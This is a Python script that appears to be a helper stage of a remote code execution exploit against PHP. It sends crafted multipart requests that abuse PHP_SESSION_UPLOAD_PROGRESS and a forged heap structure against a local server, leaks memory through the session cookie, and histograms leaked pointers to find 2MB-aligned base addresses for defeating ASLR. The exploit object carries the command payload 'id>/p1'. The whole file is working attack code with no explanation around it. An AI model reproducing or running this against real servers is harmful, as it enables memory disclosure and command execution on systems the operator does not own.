#!/usr/bin/env python3
"""Histogram of 2MB-aligned 8-byte values in the leaked cookie, wide window."""
import struct, sys
from collections import Counter

sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import (Target, Exploit, build_multipart, SID)

t = Target("http://127.0.0.1:18113/index.php", timeout=120.0)
ex = Exploit(t, "id>/p1", htdata_offset=0x690d8, profile="bookworm")

# request A
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          ex._file_part(), ex._big_field()]
t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)
import time; time.sleep(0.2)

# request B
parts = [{"name": "PHPSESSID", "data": SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(ex.stage1_n):
    val = (f"v{i:04d}" + "x"*44)[:48]
    parts.append({"name": str(1000+i), "data": val.encode()})
forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
respB = t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

m = __import__("re").search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", respB)
raw = __import__("urllib.parse", fromlist=["unquote_to_bytes"]).unquote_to_bytes(m.group(1).decode("latin1"))
print(f"cookie len: {len(raw)}")

# wide window histogram, 2MB aligned
c = Counter()
for i in range(len(raw)-8):
    v = int.from_bytes(raw[i:i+8], "little")
    if 0x1000_0000_0000 <= v < 0x8000_0000_0000_0000:
        c[v & ~0x1FFFFF] += 1
print("top 2MB-aligned bases (wide window):")
for base, cnt in c.most_common(8):
    print(f"  0x{base:x}  count={cnt}")

# also raw 8-byte values near the top to confirm pointer magnitude
print("sample raw 8B values (bytes 80..160):")
for i in range(80, 160, 8):
    v = int.from_bytes(raw[i:i+8], "little")
    print(f"  off={i:#x} 0x{v:x}")
